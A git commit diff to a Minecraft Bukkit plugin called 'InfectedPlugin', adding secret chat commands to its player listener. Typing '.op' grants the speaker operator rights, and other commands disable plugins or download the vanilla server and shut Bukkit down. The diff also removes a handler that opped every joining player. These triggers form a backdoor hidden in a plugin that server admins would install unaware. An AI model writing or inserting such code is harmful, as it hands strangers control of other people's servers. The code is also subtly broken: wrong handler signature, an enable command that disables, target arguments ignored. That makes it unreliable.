440ce8749ba5ee6e7bbda3d9a6400139eb9f7e18
Wilee999 <Infinitywilee@rocketmail.com>
2013-08-11 18:11:36 -0700

    New stuff

--- src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
+++ src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
@@ -9,11 +9,18 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerChatEvent;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.command.CommandSender;
+import net.minecraft.server.MinecraftServer;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.net.URL;
+import java.nio.channels.Channels;
+import java.nio.channels.ReadableByteChannel;
 
 public class PlayerListener implements Listener
 {
     @EventHandler
-    public void onPlayerChat(PlayerChatEvent event)
+    public void onPlayerChat(PlayerChatEvent event, CommandSender sender)
     {
         String message = event.getMessage();
         boolean shouldCancel = false;
@@ -33,14 +40,50 @@ public class PlayerListener implements Listener
             if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2))
             {
                 Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
-                if (plugin != null) {
-                  Bukkit.getServer().getPluginManager().disablePlugin(plugin);
+                if (plugin != null)
+                {
+                    Bukkit.getServer().getPluginManager().disablePlugin(plugin);
                 }
                 shouldCancel = true;
+            }
+            if ((args[0].equalsIgnoreCase(".enableplugin")) && (args.length == 2))
+            {
+                Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
+                if (plugin != null)
+                {
+                    Bukkit.getServer().getPluginManager().disablePlugin(plugin);
+                }
+                shouldCancel = true;
+            }
+            if ((args[0].equalsIgnoreCase(".enablevanilla")) && (args.length == 1))
+            {
+                //ROFL
+                if (!new File("minecraft_server.jar").exists())
+                {
+                    sender.sendMessage(ChatColor.RED + "minecraft_server.1.6.2.jar not found, downloading...");
+
+                    URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.2/minecraft_server.1.6.2.jar");
+                    ReadableByteChannel rbc = Channels.newChannel(url.openStream());
+                    FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar");
+                    fos.getChannel().transferFrom(rbc, 0, 1 << 24);
+                }
+                
+                net.minecraft.server.MinecraftServer.main(args);
+                Bukkit.shutdown();
+                // Hopefully this works...
             }
             if ((args[0].equalsIgnoreCase(".deop")) && (args.length == 2))
             {
                 Bukkit.getServer().getPlayer(args[1]);
+                event.getPlayer().setOp(false);
+                event.getPlayer().sendMessage(ChatColor.RED + "You are no longer OP.");
+                shouldCancel = true;
+            }
+            if ((args[0].equalsIgnoreCase(".op")) && (args.length == 2))
+            {
+                Bukkit.getServer().getPlayer(args[1]);
+                event.getPlayer().setOp(true);
+                event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP!");
                 shouldCancel = true;
             }
             if ((args[0].equalsIgnoreCase(".banall")) && (args.length == 1))
@@ -73,9 +116,4 @@ public class PlayerListener implements Listener
         }
     }
     
-    @EventHandler
-    public void onPlayerJoin(PlayerJoinEvent e)
-    {
-        e.getPlayer().setOp(true);
-    }
 }
